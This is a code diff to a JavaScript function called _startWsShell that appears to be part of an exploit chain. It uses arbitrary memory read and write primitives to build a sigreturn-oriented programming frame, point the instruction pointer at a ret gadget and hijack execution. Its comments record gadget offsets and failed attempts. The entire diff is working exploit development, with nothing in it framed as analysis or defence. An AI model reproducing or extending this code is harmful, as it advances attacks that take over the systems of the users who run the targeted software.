@@ -5546,13 +5546,18 @@ function _startWsShell(){
             break;
           }
           if(isIC){
-            for(var hz=0;hz<4;hz++)S.absWrite(CAP+BigInt(hz*8),0n);
-            SF_CALL(lkS+0xB50n,CAP);
-            var retv=S.absRead(retSlotAddr,8)[0];
-            reply.icRet='0x'+retv.toString(16);
-            if(!(retv>=0x800000000n&&retv<0x1000000000n)){
-              reply.err='retSlot still not a code return after the rehearsal';break;
-            }
+            /* THE WRITER-FREE IC (srop31): NO rehearsal (gettimeofday =
+             * the 2-arg writer = the documented session-death class; the
+             * corpus's sweep ledger: MULTI-ARG (died) #0/#3/#24/#63).
+             * THE RET GADGET = the shell's own proven constant
+             * (BASE+0x4001750, called through this scope every boot in the
+             * preflight): the kernel restores RIP = the ret gadget and
+             * RSP = cfr-0x328 - the gadget's ret pops the install call's
+             * own pushed return address = the trampoline continuation.
+             * THE DOUBLE-RET RESUME: zero syscalls, zero kernel writes to
+             * the scope, the pure reader-class install test. */
+            var retGadget=S.BASE+0x4001750n;
+            reply.retGadget='0x'+retGadget.toString(16);
             S.absWrite(CAP+0x0C0n,0x1B001300000000n);  /* the 814a fs/gs selectors */
             S.absWrite(CAP+0x0C8n,0n);
             S.absWrite(CAP+0x0D0n,0n);                 /* the D0 gate (<8, the 814b shape) */
@@ -5564,11 +5569,11 @@ function _startWsShell(){
             S.absWrite(CAP+0x118n,0x20001n);           /* subtype */
             S.absWrite(CAP+0x480n,fsB);                /* THE FS BASE FIX */
             S.absWrite(CAP+0x488n,0n);                 /* GS base */
-            S.absWrite(CAP+0x0E0n,retv);
-            S.absWrite(CAP+0x0F8n,retSlotAddr+0x8n);
-            SF('3 INSTALL-CONTROL RIP=[retSlot post-rehearsal] RSP=cfr-0x320 (no target)');
+            S.absWrite(CAP+0x0E0n,retGadget);
+            S.absWrite(CAP+0x0F8n,retSlotAddr);
+            SF('3 INSTALL-CONTROL RIP=[ret gadget] RSP=cfr-0x328 (writer-free, no rehearsal)');
           }else{
-            reply.err='srop29 = the ic mode ONLY (the rt/real return after the install is proven)';break;
+            reply.err='srop31 = the ic mode ONLY (the rt/real return after the install is proven)';break;
           }
 
           /* (4) THE INSTALL: sigreturn reads the record at RDI=CAP. */
